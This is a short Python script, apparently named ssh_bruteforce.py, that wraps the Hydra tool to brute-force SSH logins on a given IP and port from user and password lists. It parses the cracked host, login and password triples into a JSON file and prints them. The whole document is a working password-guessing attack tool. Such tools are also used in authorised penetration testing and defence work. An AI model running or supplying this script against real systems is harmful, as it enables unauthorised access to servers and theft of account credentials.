import sys
import subprocess
import json
import re

def run_hydra(target_ip, port, user_list, pass_list):
    command = [
        'hydra', '-L', user_list, '-P', pass_list, '-s', port, '-o', 'hydra_results.txt', '-f', '-V', target_ip, 'ssh'
    ]

    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        with open('hydra_results.txt', 'r') as file:
            raw_results = file.read()
        
        parsed_results = parse_hydra_output(raw_results)
        with open('hydra_results.json', 'w') as json_file:
            json.dump(parsed_results, json_file, indent=4)
        
        return parsed_results
    except subprocess.CalledProcessError as e:
        return f"Erreur lors de l'exécution de Hydra: {e.stderr}"

def parse_hydra_output(raw_output):
    results = []
    for line in raw_output.splitlines():
        match = re.search(r'\[ssh\] host: (\S+)   login: (\S+)   password: (\S+)', line)
        if match:
            results.append({
                'host': match.group(1),
                'login': match.group(2),
                'password': match.group(3),
                'status': 'success'
            })
    return results

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 ssh_bruteforce.py <target_ip> <port> <user_list> <pass_list>", file=sys.stderr)
        sys.exit(1)

    target_ip = sys.argv[1]
    port = sys.argv[2]
    user_list = sys.argv[3]
    pass_list = sys.argv[4]

    results = run_hydra(target_ip, port, user_list, pass_list)
    print(json.dumps(results, indent=4))
